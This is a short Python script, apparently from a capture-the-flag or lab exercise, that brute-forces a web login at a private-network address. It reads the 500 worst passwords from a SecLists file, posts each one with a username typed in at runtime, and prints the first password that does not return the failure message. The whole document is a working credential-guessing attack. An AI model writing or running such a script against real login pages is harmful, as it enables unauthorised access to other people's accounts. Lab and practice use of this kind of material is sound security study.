'''
The purpose of this code is to rapidly run common passwords 
for the admin account, and will output any value that doesn't produce the
response "Incorrect Password"
'''

import requests

# checks admin password against top 500 bad passwords:
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/500-worst-passwords.txt
# normally, I would use more, but scared of server load

pass_file = open("../500-worst-passwords.txt")
user = input("Username to crack: ")

for line in pass_file:
    pw = line.rstrip()
    r = requests.post("http://10.66.28.202:8230/login", data={
        "medicare": user,
        "password": pw
    })
    if r.text != "Username/password doesn't match homie. <a href='javascript:history.back()''>Go back</a>":
        print(pw)
        break

